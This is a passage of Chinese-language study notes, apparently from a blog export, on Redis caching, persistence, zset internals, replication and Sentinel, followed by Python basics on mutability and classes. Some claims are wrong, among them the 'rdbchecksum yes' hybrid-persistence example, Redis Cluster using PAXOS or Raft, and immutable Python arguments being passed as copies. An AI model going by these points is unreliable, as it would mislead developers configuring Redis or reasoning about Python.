缓存雪崩问题描述大量 key 在同一时刻同时失效，所有请求同时穿透，数据库被压垮。
典型场景比如你缓存设置了 1 小时统一过期，某一时刻恰好全部失效，系统瞬间崩溃。
解决方案
过期时间加随机扰动
给每个 key 设置不同的过期时间，避免同一时间集中失效。例如 EX 600 + random(0~60)。


热点数据永不过期 + 后台异步刷新
降级保护机制
当发现缓存异常，短路请求，直接返回默认值、静态页等。




自问自答
什么是缓存穿透？怎么解决？
缓存击穿和穿透的区别是什么？
怎么解决 Redis 大量 key 同时过期的雪崩问题？
使用 Redis 做缓存时，是否建议 key 永久有效？
有没有用过布隆过滤器？什么原理？ 是个概率性的数据结构， 用多个不同的哈希算法， 拿到的哈希值如果对应的都是1， 就是1， 只要有一个是0， 就是0， 因此存的数据量越大， 越容易误报

Redis的持久化机制（RDB 与 AOF）Redis 虽然是内存数据库，但为了防止数据丢失，提供了两种持久化机制：RDB（快照）和 AOF（追加日志）。

持久化方式概览


类型
全称
特点
数据安全性
文件大小
启动速度



RDB
Redis DataBase snapshot
定期快照
较低
小
快


AOF
Append Only File
日志追加
高
大
慢（需重放）


混合模式
RDB + AOF
Redis 4.0 后默认
综合优点
可控
快速恢复



RDB（快照方式）原理
Redis 在一定时间间隔内将内存数据写入一个压缩过的二进制文件（.rdb）
触发方式：
自动：配置 save 900 1（900 秒内至少 1 个 key 变动）
手动：执行 SAVE 或 BGSAVE 命令



优点
启动恢复速度快
文件体积小，适合备份、灾备迁移

缺点
可能丢失最近一次修改（最后一次快照之后的数据）
BGSAVE 会 fork 子进程，写入大文件时会造成系统负载升高


AOF（日志方式）原理
所有写命令会追加到 .aof 文件中，Redis 重启时按顺序“重放命令”恢复数据
三种刷盘策略（由 appendfsync 决定）：
always：每次写都刷盘（最安全，最慢）
everysec：每秒刷一次（默认）
no：由操作系统决定（可能丢失几秒）



优点
数据恢复更完整（最多丢失 1 秒）
适合对数据完整性要求高的场景

缺点
文件越来越大，需要定期重写（BGREWRITEAOF）
启动时需要重放日志，恢复速度比 RDB 慢


混合持久化（Redis 4.0+）原理
在 AOF 重写时，先将当前快照（RDB 格式）写入 AOF，然后再追加后续写命令
好处：
启动速度几乎和 RDB 一样快
数据完整性和 AOF 一样高



开启方式aof-use-rdb-preamble yes


配置示例save 900 1appendonly yesappendfsync everysecdir /var/lib/redis


自问自答
Redis 持久化有几种方式？分别适用于什么场景？
如果 Redis 宕机了，数据怎么恢复？会不会丢数据？
RDB 和 AOF 哪个恢复速度更快？哪个更安全？
怎么避免 RDB&#x2F;AOF 持久化造成主线程卡顿？


实战建议


建议
理由



开启 AOF + everysec 模式
实现安全性和性能的平衡


配置 save 900 1 等参数
保留定期快照，便于快速恢复


设置 aof-use-rdb-preamble yes
兼顾快速启动与完整性


使用 Redis 主从 + 持久化
容灾架构更稳妥


Redis 是怎么做 AOF 重写的？会不会影响性能？在 Redis 中，AOF（Append Only File）重写 是一种用于优化磁盘 I&#x2F;O 和 AOF 文件大小的机制。AOF 重写是 Redis 在持久化数据时采取的一种方式，目的是定期生成新的 AOF 文件，从而减少旧文件的大小并提高性能。
什么是 AOF 重写？Redis 使用 AOF 持久化机制时，会将所有的写命令记录到 AOF 文件中，这样即使 Redis 重启，数据也不会丢失。随着时间的推移，AOF 文件可能会变得非常大，尤其是在有大量写操作的场景下。为了避免 AOF 文件过大，Redis 提供了 AOF 重写（AOF rewrite） 机制。
AOF 重写是指 Redis 会创建一个新的 AOF 文件，只记录 当前数据库状态 的最简写操作，从而生成一个更小的文件。这个过程不会影响 Redis 正常的写操作，但会在后台进行，保证 Redis 在重写期间继续为客户端提供服务。
AOF 重写的工作原理
触发条件：
AOF 重写通常由 Redis 根据 AOF 文件的大小和重写条件来触发。重写会在 Redis 认为 AOF 文件过大时自动进行，或者也可以通过手动调用 BGREWRITEAOF 命令来触发。


重写过程：
在 AOF 重写过程中，Redis 会创建一个新的 AOF 文件，并在后台 重新生成 AOF 文件中的命令。这个过程会记录所有当前数据库状态所需的最小写命令。
比如，如果数据库中某个键的值已经改变了多次，Redis 会将该键的最终状态写入新的 AOF 文件，而不再记录每次对该键的修改操作。


AOF 重写的工作步骤：
步骤 1：Redis 在后台创建一个新的 AOF 文件，并逐个遍历数据库中的所有键，生成一组命令来重新构建当前数据库的状态。
步骤 2：当新的 AOF 文件创建完成后，Redis 会将当前 AOF 文件中的所有命令写入新文件中，确保新文件包含了数据库的最新状态。
步骤 3：一旦新的 AOF 文件完成，Redis 会关闭原来的 AOF 文件，将新的文件替换为当前 AOF 文件。


后台执行：
在进行 AOF 重写时，Redis 会使用 后台（fork） 的方式创建一个子进程来执行重写操作。这个子进程会处理数据的写入，不会影响主进程的运行。
这种方式允许 Redis 在 AOF 重写期间继续服务客户端请求，保证了系统的高可用性。



AOF 重写是否会影响性能？AOF 重写的过程是通过 fork 子进程 来执行的，因此在执行重写时，Redis 主进程可以继续服务客户端请求。但是，AOF 重写操作还是会对性能产生一定的影响，具体体现在以下几个方面：

内存占用：
在 AOF 重写期间，Redis 会在后台创建一个子进程，并复制主进程的内存空间。这意味着在重写过程中，Redis 的内存使用量会增加，因为它需要同时保持原有的 AOF 文件和新的 AOF 文件内容。对于内存较小的机器，这可能会导致内存使用高峰。


CPU 占用：
AOF 重写需要扫描整个数据库，并生成新的 AOF 文件，这会消耗一定的 CPU 资源。虽然 Redis 会在后台执行这一过程，但在大数据量的情况下，CPU 的负载可能会暂时增高。


磁盘 I&#x2F;O：
AOF 重写会生成新的 AOF 文件，并将新的命令写入磁盘。这会增加磁盘的写入压力。如果磁盘性能较差或 I&#x2F;O 较高的场景下，可能会对性能产生影响。


阻塞时间：
在某些情况下，尤其是当 AOF 文件非常大，或者当系统资源有限时，AOF 重写可能会导致 Redis 的响应时间略微增加，特别是在频繁触发 AOF 重写时。


fork 子进程的影响：
Redis 使用 fork 创建子进程来执行 AOF 重写操作，而 fork 操作会占用一定的系统资源。虽然子进程会在重写完成后被销毁，但在 fork 的过程中，操作系统需要进行内存页的复制，这会消耗 CPU 和内存资源。



如何减少 AOF 重写对性能的影响？为了减少 AOF 重写对性能的影响，可以采取以下策略：

**合理设置 **auto-aof-rewrite-percentage** 和 ****auto-aof-rewrite-min-size**：
auto-aof-rewrite-percentage：控制触发 AOF 重写的条件。它设置为相对于上次重写时 AOF 文件的大小增长百分比。
auto-aof-rewrite-min-size：控制 AOF 文件的最小大小，只有当文件大小超过这个值时，才会考虑执行 AOF 重写。



通过合理配置这两个参数，可以控制 AOF 重写的触发频率，从而避免频繁的 AOF 重写操作，减小对性能的影响。
auto-aof-rewrite-percentage 100  # AOF 文件大小增加 100% 后进行重写auto-aof-rewrite-min-size 64mb  # AOF 文件超过 64MB 时才进行重写


使用合适的硬件资源：
如果可能，考虑为 Redis 配置更高性能的硬件，尤其是 I&#x2F;O 密集型的存储设备（如 SSD）。更强大的硬件可以显著减少 AOF 重写过程中对磁盘 I&#x2F;O 的压力。


优化 **maxmemory-policy** 配置：
在 Redis 中设置合理的内存回收策略，确保内存不会过度占用，避免因内存不足导致频繁的 AOF 重写。


分批写入数据：
对于大量写入数据的场景，考虑将数据写入 Redis 时分批处理，减少瞬时写入压力，降低 AOF 文件增长速度。


使用 AOF + RDB 混合持久化（RDB + AOF）：
Redis 还支持同时使用 RDB（快照） 和 AOF 两种持久化方式，您可以通过配置 Redis 在一定间隔内执行快照（RDB）保存，并在更高频次下执行 AOF 持久化。这可以减小对性能的影响，同时保证数据持久化。



# 启用 RDB 和 AOF 混合持久化appendonly yesappendfsync everysecsave 900 1save 300 10save 60 10000

总结AOF 重写是 Redis 为了优化 AOF 文件大小、提高性能和减少磁盘 I&#x2F;O 而采取的机制。虽然 AOF 重写通常是在后台进行，不会阻塞主进程，但它确实会消耗一些额外的 CPU 和内存资源，尤其是在大数据量的情况下。因此，合理的配置和硬件资源的支持是确保 AOF 重写不会对性能产生过大影响的关键。

怎么避免 RDB&#x2F;AOF 持久化造成主线程卡顿在 Redis 中，RDB 和 AOF 是两种常见的持久化机制，它们会定期将内存中的数据持久化到磁盘，确保数据的持久性。但这两个过程可能会造成一定的 主线程卡顿，特别是在大规模数据存储或高并发环境下，RDB 和 AOF 持久化过程会占用大量的 CPU 和 I&#x2F;O 资源，从而影响 Redis 的响应速度和性能。
下面是一些避免 RDB&#x2F;AOF 持久化造成主线程卡顿的方法
1. 使用 RDB 快照时采用后台保存（save 和 BGSAVE）
默认情况下，Redis 使用 **BGSAVE**（背景保存）来执行 RDB 快照操作。BGSAVE 会在后台创建一个子进程，主线程继续服务客户端请求。
BGSAVE 操作不会阻塞主线程，它通过 fork() 子进程的方式执行，因此可以在不影响 Redis 主线程的情况下进行持久化。
注意：如果在 Redis 配置中使用 **save** 命令来设置 RDB 快照（比如每隔 900 秒进行一次快照），如果在执行 RDB 时不使用 BGSAVE，则会导致 阻塞，因为此时 Redis 主线程会被锁定，直到 RDB 快照完成。

配置：
# RDB 快照配置示例save 900 1save 300 10save 60 10000

在 BGSAVE 执行期间，主线程仍然可以继续处理客户端请求。
2. 合理配置 AOF 持久化AOF（Append Only File）将 Redis 执行的所有写操作追加到 AOF 文件中，以保证持久化数据。AOF 的同步策略（appendfsync）决定了每次写入操作是如何同步到磁盘的：

**appendfsync always**：每次写操作都会同步到磁盘，性能最低，通常不推荐。
**appendfsync everysec**：每秒同步一次。是推荐的设置，性能和数据持久性之间有一个良好的平衡。
**appendfsync no**：让操作系统决定何时将数据同步到磁盘，性能最高，但在系统崩溃时可能会丢失一些数据。

推荐设置：
appendonly yesappendfsync everysec  # 每秒钟一次同步到磁盘

appendfsync everysec 可以最大限度减少 AOF 持久化对主线程的影响，同时确保数据的持久性。
3. 启用 AOF 重写机制AOF 文件随着时间的推移会变得越来越大，这样会导致持久化操作变得非常慢，影响 Redis 的性能。为了防止 AOF 文件过大导致性能下降，Redis 提供了 AOF 重写（AOF rewrite） 机制。
AOF 重写 的过程是将当前数据库的状态重新写入 AOF 文件，并且会创建一个新的 AOF 文件，而不记录所有历史操作。AOF 重写是通过一个后台进程来完成的，因此它不会影响主线程。
AOF 重写的触发条件：

当 AOF 文件的大小超出一定比例时（默认是 100%）。
可以通过配置 auto-aof-rewrite-percentage 和 auto-aof-rewrite-min-size 来控制触发条件。

配置示例：
# 自动触发 AOF 重写的条件auto-aof-rewrite-percentage 100  # 当 AOF 文件大小增加 100% 时触发重写auto-aof-rewrite-min-size 64mb  # 当 AOF 文件超过 64MB 时触发重写

通过合理配置 AOF 重写，Redis 可以自动优化 AOF 文件的大小，避免在文件过大的时候影响性能。
4. 优化磁盘 I&#x2F;O 性能RDB 和 AOF 持久化操作都涉及到磁盘 I&#x2F;O，因此磁盘性能对于持久化的效率至关重要。使用更快的存储设备（例如 SSD）可以显著提高持久化过程的性能，减少对主线程的影响。
优化建议：

使用 SSD（固态硬盘）而不是传统的 HDD（机械硬盘），以减少磁盘 I&#x2F;O 的延迟。
将 Redis 的数据目录和 AOF 文件存储在不同的物理磁盘上，避免磁盘 I&#x2F;O 竞争。
通过 **vm.dirty_background_bytes** 等内核参数来调整操作系统的 I&#x2F;O 调度策略，优化磁盘写入效率。

5. 定期执行 MEMORY PURGE 清理内存碎片当 Redis 进行大量写入和持久化时，内存碎片可能导致内存管理效率低下，从而影响 Redis 性能。使用 **MEMORY PURGE** 命令可以清理 Redis 中的内存碎片，释放无用内存，从而减少内存使用和提高性能。
MEMORY PURGE  # 清理内存碎片

定期执行内存清理操作有助于减轻持久化时的内存负担，从而改善 Redis 性能。
6. 使用混合持久化（RDB + AOF）Redis 支持混合持久化，即同时使用 RDB 和 AOF。通过这种方式，Redis 可以在启动时使用 RDB 快照来恢复数据，而在写操作时使用 AOF 进行持久化。混合持久化通过减少 AOF 文件的大小来优化性能，并提高 Redis 的启动速度。
启用混合持久化：
appendonly yesappendfsync everysecrdbchecksum yes

混合持久化的优势是，在不牺牲持久化的可靠性和完整性的情况下，通过 AOF 重写和 RDB 快照的结合来减少磁盘 I&#x2F;O 的压力。
总结为了避免 RDB 和 AOF 持久化造成 Redis 主线程卡顿，可以采取以下措施：

**使用 ****BGSAVE** 执行 RDB 快照，避免阻塞主线程。
合理配置 AOF 持久化策略（推荐 appendfsync everysec）来平衡性能和持久性。
利用 AOF 重写 来减少 AOF 文件的大小，避免性能下降。
优化磁盘 I&#x2F;O 性能，使用 SSD 或更快的存储设备来提高持久化效率。
定期清理内存碎片，通过 MEMORY PURGE 来减轻内存管理负担。
使用混合持久化（RDB + AOF）来提升性能，减少 AOF 文件大小。

通过这些方法，您可以减少 RDB 和 AOF 持久化对 Redis 性能的影响，提高系统的响应速度和可用性。
Redis是怎么存储有序集合zset的Redis 的 ZSet（有序集合），它在 Redis 中扮演着非常核心的角色，特别适用于排行榜、延时队列、权重调度等场景。

什么是 ZSet（Sorted Set）ZSet 是 Redis 中的一种数据结构，全称是 有序集合（Sorted Set）。
它的特点是：

每个元素都是唯一的（像 Set）
每个元素关联一个 score（分数），按 score 排序（像优先队列）
可以按分数范围、高低排名、高低分数做高效查询

你可以把 ZSet 看成是：带权重的 Set + 排序链表 + 快速查找结构

数据结构实现：跳表 + 哈希表ZSet 底层用了两个结构：
哈希表（dict）
快速定位元素对应的 score
key 是元素，value 是 score


跳表（skiplist）
维持元素按 score 升序排列
用于支持范围查找、区间遍历、按排名查询等



为什么用跳表而不是红黑树？

插入&#x2F;删除逻辑简单
查询效率也接近 O(log n)
Redis 追求极致性能，跳表是工程中性能 + 简洁度权衡最佳的结构


核心操作和性能


操作
命令
时间复杂度
说明



添加&#x2F;更新元素
ZADD key score member
O(log n)
插入或更新元素，跳表中调整顺序


删除元素
ZREM key member
O(log n)
删除成员，同时从 dict 和 skiplist 删除


查询成员的分数
ZSCORE key member
O(1)
直接从 dict 中查


按排名查成员
ZRANGE key start stop
O(log n + m)
从跳表中按顺序取元素


查某个成员的排名
ZRANK key member
O(log n)
在跳表中向下查找节点，统计 rank


范围删除
ZREMRANGEBYSCORE key min max
O(log n + m)
从跳表中范围定位，然后批量删除


分数区间查找
ZRANGEBYSCORE key min max
O(log n + m)
先用跳表查 min，再往后遍历


获取总数
ZCARD key
O(1)
获取元素个数


获取某 score 范围内的个数
ZCOUNT key min max
O(log n)
范围查找后累加统计


其中 m 表示范围内返回的元素数量。

跳表结构内部逻辑（示意）以一个 ZSet 示例：
ZADD z 5 aliceZADD z 10 bobZADD z 7 tomZADD z 1 kate

跳表结构会长成这样（层数为随机生成的）：
Level 3:            bobLevel 2:      tom - bobLevel 1: kate - tom - alice - bob

每一层是有序链表，底层记录所有元素，查询从顶层开始，逐层往下，最终在底层找到目标。

应用场景举例排行榜（经典）ZADD game 1000 user1ZADD game 950 user2ZADD game 1200 user3ZRANGE game 0 -1 WITHSCORES   # 按分数升序输出所有玩家ZREVRANK game user1           # 查看 user1 的排名（倒序）

延时队列用 score 表示未来的执行时间戳：
ZADD task_queue 1680000000 task_id_123ZRANGEBYSCORE task_queue 0 1680001000 LIMIT 0 1# 查当前需要执行的任务

动态权重调度（比如任务优先级）score 表示优先级，值越小优先级越高：
ZADD job 1 job1ZADD job 3 job2ZRANGE job 0 0        # 获取优先级最高的任务ZREM job job1         # 删除执行完成的任务


与 List、Set、Hash 的对比


结构
是否排序
是否支持范围查找
插入&#x2F;查找复杂度
用途



List
按插入顺序
支持（按位置）
O(1)&#x2F;O(n)
消息队列


Set
无序
不支持
O(1)
唯一元素集合


ZSet
按 score 排序
支持
O(log n)
排行榜、延迟队列


Hash
无序
不支持
O(1)
映射结构



内存占用注意事项ZSet 中的跳表节点比较复杂，包含：

元素值（字符串）
score（double）
多级 forward 指针
span 用于计算 rank

如果元素很多、节点层数高，跳表的内存占用会比普通链表&#x2F;集合大，需要注意评估。

总结
ZSet 是 Redis 提供的有序集合结构
底层是 哈希表 + 跳表 的组合，既支持快速定位，也支持按顺序遍历
提供排名、区间删除、分数查找、范围扫描等高级操作
实现简单、查询快、非常适合排行榜、权重调度、定时任务等场景
是 Redis 中最具代表性的高性能数据结构之一

好的，我们进入 Redis 学习的第五讲，讲解：

Redis 的主从复制与 Sentinel 高可用机制在生产环境中，单台 Redis 实例面临单点故障、无法扩容等问题。为了解决这类问题，Redis 提供了主从复制和哨兵机制（Sentinel），实现基本的高可用。

主从复制（Replication）作用
实现读写分离（主写从读）
提供故障转移能力的基础
多机热备，提高数据安全性

架构示意Client       |    +------+       +------+    | Master | --&gt; | Slave1|    +------+       +------+                      |                   +------+                   |Slave2|                   +------+

启动主从复制在从库的 redis.conf 中设置：
replicaof &lt;master-ip&gt; &lt;master-port&gt;

或者运行时命令：
replicaof 127.0.0.1 6379

同步过程
从库连接主库，发送 PSYNC 命令
首次同步：主库执行 BGSAVE 生成 RDB 文件并发送给从库
增量同步：之后通过命令流（replication backlog）持续同步

特点
主库写，从库同步，数据最终一致
从库是只读状态
支持链式结构（slave -&gt; slave）


Sentinel（哨兵）机制作用
自动监控 Redis 主从节点状态
主节点故障时，自动故障转移（failover）
提供主节点的服务发现功能

架构图+---------+         +---------+         +---------+|Sentinel1|         |Sentinel2|         |Sentinel3|+----+----+         +----+----+         +----+----+     \                    |                   /      \                  |                  /       \                |                 /        +------------+  |  +------------+                     |  |  |                  +--v--v--v--+                  |  Master   |                  +--+-----+--+                     |     |                  +--v--+ +--v--+                  |Slave1| |Slave2|                  +------+ +------+

核心组件
监控（Monitor）：定时 PING 主从节点
通知（Notification）：主节点异常后发起故障报告
投票（Leader Election）：多个哨兵协商选主
故障转移（Failover）：重新选主并通知所有从库更新主节点

配置示例sentinel monitor mymaster 127.0.0.1 6379 2sentinel down-after-milliseconds mymaster 5000sentinel failover-timeout mymaster 10000sentinel parallel-syncs mymaster 1

特点
最少部署 3 个哨兵节点，确保仲裁可靠性
会自动修改从库指向新主库
与客户端配合使用，实现服务发现（客户端动态连接主节点）


自问自答
Redis 主从同步机制是什么？全量同步和增量同步怎么实现？
Redis Sentinel 的作用是什么？如何实现自动故障转移？
Redis 主从架构如何避免脑裂？
Redis 从库能写入吗？为什么？
Redis Sentinel 和 ZooKeeper 的区别？


实战建议


建议
理由



使用至少 1 主 2 从 3 哨兵结构
实现高可用、读写分离


设置 min-slaves-to-write
保证主库写操作安全


Sentinel + 客户端主节点发现
防止客户端连接老主节点


定期监控主从延迟
避免读到旧数据


Redis 主从架构如何避免脑裂使用 Redis Sentinel（哨兵）Redis Sentinel 是官方提供的高可用性解决方案，主要用于监控 Redis 实例的状态，进行故障转移，并通知管理员。通过 Redis Sentinel 可以有效避免脑裂问题，具体做法包括：

监控主从节点：Sentinel 定期检查 Redis 实例的健康状况，一旦主节点不可用，Sentinel 会自动选举一个新的主节点。
故障转移：当检测到主节点不可用时，Sentinel 会从从节点中选举一个新的主节点，自动进行故障转移，确保服务的持续可用。
通知报警：在发生故障时，Sentinel 会通过邮件、短信等方式通知管理员，便于及时处理。

这种方式可以确保即使主节点失效，从节点能够迅速接管，减少脑裂的风险。
配置 auto-aof-rewrite 和 appendonlyRedis 在启用 AOF（Append Only File）持久化模式时，每个写操作都会被记录到 AOF 文件中，这样可以在恢复时保持数据一致性。脑裂发生时，如果从节点与主节点的数据不一致，AOF 文件可以在重启时应用，确保数据恢复。
然而，仅依赖 AOF 并不能完全避免脑裂，结合 Redis Sentinel 可以增强整体的高可用性和一致性。
配置 min-slaves-to-write 和 min-slaves-max-lag为了减少脑裂的可能性，可以在主节点上配置以下参数：

**min-slaves-to-write**：在进行写操作时，主节点要求至少有 N 个从节点同步确认。这有助于确保主节点的数据不会丢失，并避免主从数据不一致。
**min-slaves-max-lag**：限制从节点的最大延迟，如果某些从节点的同步延迟过大，主节点将停止接受写操作，避免因为数据延迟而导致的数据不一致。

通过这些配置，确保主节点只有在至少一部分从节点同步成功的情况下才会执行写操作，有助于减少脑裂的发生。
使用 Redis Cluster（集群）Redis 集群是一种分布式部署方式，能够通过分片将数据分布到多个节点上，每个主节点都有一个或多个从节点进行备份。在 Redis 集群中：

主从备份：每个主节点都有一个或多个从节点作为备份，确保主节点故障时可以进行快速的故障转移。
自动选举：集群内部会自动进行主节点的选举，避免了因为某个节点不可用而导致的数据不一致。
PAXOS 或 Raft 协议：集群内部使用一致性协议来确保数据的一致性，避免脑裂问题。

使用 Redis 集群可以通过分布式架构减少单点故障的影响，自动化的故障转移机制有效降低了脑裂发生的几率。
合理设计客户端架构为了避免在 Redis 主从架构中发生脑裂问题，客户端架构需要能够动态适应主从节点的变化。现代 Redis 客户端（如 redis-py）通常支持与 Redis Sentinel 或 Redis Cluster 协作，能够自动获取当前的主节点信息，并在发生故障时自动切换连接。
客户端应具备以下功能：

自动发现主节点：客户端能够自动从 Sentinel 或集群获取主节点信息，确保在节点变化时无缝切换。
支持故障转移：客户端支持 Sentinel 的故障转移机制，能够在主节点不可用时自动连接到新的主节点。

通过设计智能客户端，可以减少由于节点故障带来的脑裂问题。
监控和报警系统除了配置 Redis Sentinel 和 Redis 集群外，建立全面的监控和报警系统同样重要。通过监控 Redis 实例的健康状态，可以在节点出现异常时及时发现问题，避免脑裂的发生。
常见的监控项包括：

节点的连接状态和响应时间
主从同步的延迟
Redis 实例的内存和 CPU 使用情况

结合报警系统，确保在发生故障时能够迅速采取措施进行修复，防止脑裂的发生。
总结通过使用 Redis Sentinel 或 Redis 集群，并合理配置主从同步策略，可以有效避免 Redis 主从架构中的脑裂问题。此外，设计智能客户端架构和建立完善的监控报警机制，也能进一步提升系统的容错能力，确保 Redis 在高可用性和一致性方面的稳定运行。
Redis Sentinel 和 ZooKeeper 的区别设计目标和功能Redis Sentinel： Redis Sentinel 是专为 Redis 提供高可用性解决方案的工具。它主要负责监控 Redis 实例，检测主节点的状态，并在主节点故障时执行自动故障转移，将从节点提升为新的主节点。它的核心功能包括故障检测、故障转移、通知和监控。Redis Sentinel 适用于 Redis 集群的高可用性管理。
ZooKeeper： ZooKeeper 是一个分布式协调服务，旨在帮助不同的分布式应用系统管理配置、命名、同步服务等。它不仅限于 Redis，广泛用于需要高一致性和协调的分布式系统中。ZooKeeper 提供了分布式锁、配置管理、节点监控、领导者选举等多种功能，适用于大规模的分布式应用。ZooKeeper 提供的强一致性协议使得它适用于任何需要分布式协调的应用。
总结Redis Sentinel 和 ZooKeeper 都是高可用性和分布式系统中的重要工具，但它们的应用场景、设计目标和功能有所不同。Redis Sentinel 专为 Redis 提供高可用性解决方案，适用于 Redis 集群的监控和故障转移。而 ZooKeeper 是一个通用的分布式协调服务，适用于广泛的分布式系统，提供强一致性和协调功能，支持更复杂的分布式应用。
]]></content>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Python</title>
    <url>/2025/04/22/Python/</url>
    <content><![CDATA[引用与非引用类型Python中的引用类型与非引用类型在Python中，数据类型可以分为引用类型（可变类型）和非引用类型（不可变类型）。它们在内存中的存储方式和函数传参时的行为有明显的区别。
引用类型与非引用类型引用类型（可变类型）引用类型是指那些在内存中可以被修改的对象。常见的引用类型包括：

列表（List）
字典（Dict）
集合（Set）

这些类型的对象在创建后，其内容是可以修改的。对于这些类型的数据，当它们作为函数参数传递时，实际上传递的是对象的引用（即内存地址）。因此，在函数内对该对象进行修改时，原始对象的内容会发生变化。
示例：
def modify_list(my_list):    my_list.append(4)  # 修改传入的列表lst = [1, 2, 3]modify_list(lst)print(lst)  # 输出：[1, 2, 3, 4]

在这个例子中，传入modify_list函数的是列表lst的引用，因此在函数内部对lst进行修改时，原始的lst也发生了变化。
非引用类型（不可变类型）非引用类型是指那些不能在内存中被修改的对象。常见的不可变类型包括：

整数（int）
浮点数（float）
字符串（str）
元组（tuple）

这些类型的对象一旦创建，其值不可更改。当它们作为函数参数传递时，传递的是该对象的副本。即使在函数内修改参数，原始对象的值也不会发生变化，因为不可变对象无法被修改，任何修改都会创建一个新的对象。
示例：
def modify_integer(x):    x += 1  # 修改传入的整数a = 5modify_integer(a)print(a)  # 输出：5

在上述代码中，a的值传递给modify_integer函数时，实际上是传递了a的值副本（5）。在函数内部，x的值发生变化，但a本身没有受到影响。
函数传参与引用类型、非引用类型的关系引用类型传参对于引用类型（如列表、字典等），函数接收到的是对象的引用。这意味着，函数内部修改了该对象，原始对象也会受到影响。
示例：
def modify_dict(d):    d[&quot;key&quot;] = &quot;new_value&quot;  # 修改传入的字典data = &#123;&quot;key&quot;: &quot;old_value&quot;&#125;modify_dict(data)print(data)  # 输出：&#123;&#x27;key&#x27;: &#x27;new_value&#x27;&#125;

在这个例子中，字典data作为参数传入modify_dict函数。因为字典是可变的，所以修改字典的内容会影响到原始字典data。
非引用类型传参对于不可变类型（如整数、字符串、元组等），函数接收到的是对象的值副本。尽管函数内部对该对象进行了修改，但这并不会改变原始对象的值。原因在于这些对象是不可变的，修改操作会创建新的对象。
示例：
def modify_string(s):    s += &quot; world&quot;  # 创建了新的字符串对象str1 = &quot;hello&quot;modify_string(str1)print(str1)  # 输出：hello

在这个例子中，str1作为参数传入modify_string函数。由于字符串是不可变的，s += &quot; world&quot;会创建一个新的字符串对象，str1保持不变。

类在Python中，类是创建对象的模板。类定义了对象的属性和方法，通过类可以创建多个对象，每个对象都有自己的属性和方法。理解类的基本概念是学习面向对象编程的第一步。
Python中的类与对象Python是一种面向对象的编程语言，其中类是面向对象编程的核心。类是创建对象的模板，而对象则是类的实例。理解类与对象是学习Python的重要基础。
定义一个类在Python中，类是通过class关键字来定义的。类包含了属性（也叫成员变量）和方法（也叫成员函数）。类的定义如下：
class Dog:    # 类属性    species = &quot;Canis familiaris&quot;  # 所有Dog对象共享的属性    # 初始化方法，用于初始化对象的属性    def __init__(self, name, age):        self.name = name  # 实例属性        self.age = age  # 实例属性    # 方法：类的行为    def bark(self):        print(f&quot;&#123;self.name&#125; says Woof!&quot;)

在上面的例子中，Dog类有：

一个类属性species，所有Dog对象共享这个属性。
两个实例属性name和age，每个对象都有独立的属性。
一个方法bark，表示狗叫的动作。

创建类的实例（对象）类定义好后，可以使用类来创建对象。通过调用类名并传入所需的参数来创建对象，每个对象都有自己独立的属性。
# 创建Dog类的实例dog1 = Dog(&quot;Buddy&quot;, 3)dog2 = Dog(&quot;Lucy&quot;, 5)# 访问对象的属性print(dog1.name)  # 输出：Buddyprint(dog2.age)   # 输出：5# 调用对象的方法dog1.bark()  # 输出：Buddy says Woof!dog2.bark()  # 输出：Lucy says Woof!

在这个例子中，dog1和dog2是Dog类的实例，它们各自拥有不同的name和age属性。通过调用bark()方法，它们分别发出不同的叫声。
__init__方法与构造函数__init__方法在Python中，__init__方法是类的构造函数。当创建类的实例时，__init__方法会自动调用。它用于初始化新创建对象的属性。
class Cat:    def __init__(self, name, color):        self.name = name        self.color = color    def meow(self):        print(f&quot;&#123;self.name&#125; says Meow!&quot;)# 创建一个Cat对象cat = Cat(&quot;Whiskers&quot;, &quot;black&quot;)cat.meow()  # 输出：Whiskers says Meow!

self参数__init__方法中的第一个参数是self，它代表类的实例本身。当创建对象时，self会指向当前对象。每个方法都必须包含self参数，以便访问类的属性和方法。
class Dog:    def __init__(self, name, age):        self.name = name  # self指向当前实例对象        self.age = age    def display_info(self):        print(f&quot;&#123;self.name&#125; is &#123;self.age&#125; years old.&quot;)dog = Dog(&quot;Buddy&quot;, 3)dog.display_info()  # 输出：Buddy is 3 years old.

类的继承继承是面向对象编程中的重要概念，它允许一个类继承另一个类的属性和方法。在Python中，子类继承父类时，可以重用父类的方法，也可以扩展或重写父类的方法。
class Animal:    def __init__(self, species):        self.species = species    def speak(self):        print(f&quot;&#123;self.species&#125; makes a sound&quot;)class Dog(Animal):    def __init__(self, name, age):        super().__init__(&quot;Dog&quot;)  # 调用父类的构造函数        self.name = name        self.age = age    def speak(self):        print(f&quot;&#123;self.name&#125; says Woof!&quot;)# 创建Dog对象dog = Dog(&quot;Buddy&quot;, 3)dog.speak()  # 输出：Buddy says Woof!

在这个例子中，Dog类继承了Animal类，并重写了speak方法。通过super()函数调用父类的构造函数，从而初始化Animal类的属性。
类的多态多态是指同一个方法在不同类的对象上有不同的表现。在Python中，方法的多态性通常是通过继承和方法重写实现的。
class Cat(Animal):    def __init__(self, name, age):        super().__init__(&quot;Cat&quot;)        self.name = name        self.age = age    def speak(self):        print(f&quot;&#123;self.name&#125; says Meow!&quot;)# 创建不同的对象dog = Dog(&quot;Buddy&quot;, 3)cat = Cat(&quot;Whiskers&quot;, 2)# 调用相同的方法，但不同的表现dog.speak()  # 输出：Buddy says Woof!cat.speak()  # 输出：Whiskers says Meow!

在这个例子中，dog.speak()和cat.speak()调用了相同的方法名，但由于它们分别属于Dog和Cat类，所以方法的实现不同，表现出了多态。
类的私有属性与方法在Python中，类的属性和方法默认是公有的，可以在外部访问和修改。如果希望某些属性或方法不被外部直接访问，可以通过在属性或方法名前加上双下划线（__）来将它们设为私有。
class Car:    def __init__(self, make, model, year):        self.make = make        self.model = model        self.__year = year  # 私有属性    def get_year(self):        return self.__year  # 通过公共方法访问私有属性car = Car(&quot;Toyota&quot;, &quot;Corolla&quot;, 2020)print(car.make)  # 输出：Toyotaprint(car.get_year())  # 输出：2020# 以下将抛出错误，因为__year是私有的# print(car.__year)  # 报错：AttributeError

在上面的代码中，__year是Car类的私有属性，不能被外部直接访问。通过get_year方法，外部可以间接访问该属性。
访问实例的属性的调用顺序
当类属性和实例属性重名时，优先会返回实例属性
给实例对象的属性赋值时，赋值的是实例属性，如果没有对应实例属性就会新建

